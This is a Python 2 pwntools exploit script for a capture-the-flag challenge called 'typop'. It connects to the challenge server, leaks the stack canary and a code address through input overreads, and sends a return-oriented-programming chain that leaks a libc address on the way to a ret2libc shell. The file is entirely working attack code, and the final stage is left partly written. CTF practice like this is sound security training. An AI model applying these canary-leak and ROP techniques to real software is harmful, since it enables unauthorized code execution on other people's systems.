#!/usr/bin/python2

from pwn import *

exe = ELF("chall_patched")

context.binary = exe
pop_rdi = 0x00000000000014d3 #: pop rdi ; ret
pop_rsi = 0x00000000000014d1 #: pop rsi ; pop r15 ; ret
puts_got = 0x03f90
puts_plt =  0x10d0
restart = 0x1160
system_offset = 0x45000
str_bin_sh = 0x18c33c

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("typop.chal.idek.team", 1337)

    return r


def main():
    r = conn()

    r.sendlineafter("?\n", "y")
    r.sendlineafter("?\n", "y"+"A"*9)
    r.recvuntil('A\n')
    canary = "\x00" + r.recv(7)
    print len(canary)
    canary = u64(canary)
    print hex(canary)
    # print "canary: ".format(hex(canary))
    #gdb.attach(r)
    payload = "A"*10
    payload += p64(canary)
    #payload += "A"*8
    #payload += "BBBBBBBB"
    r.sendlineafter('?\n',payload)

    r.sendlineafter("?\n", "y")
    r.sendlineafter("?\n", "y"+"A"*25)
    r.recvuntil('A\n')
    aslr_leak = "\x00" + r.recv(6)[:-1] + "\x00\x00" 
    print aslr_leak
    aslr = u64(aslr_leak) - 0x1400
    print hex(aslr)
    #gdb.attach(r)
    payload = "a"*10
    payload += p64(canary)
    payload += p64(0)
    payload += p64(aslr+pop_rdi)
    payload += p64(aslr + puts_got)
    payload += p64(aslr + puts_plt)
    payload += p64(aslr + restart)
    #payload += "/srv/app/fla"
    r.sendlineafter('?\n',payload)
    puts = u64(r.recv(6) + "\x00\x00")
    print hex(puts)
    gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
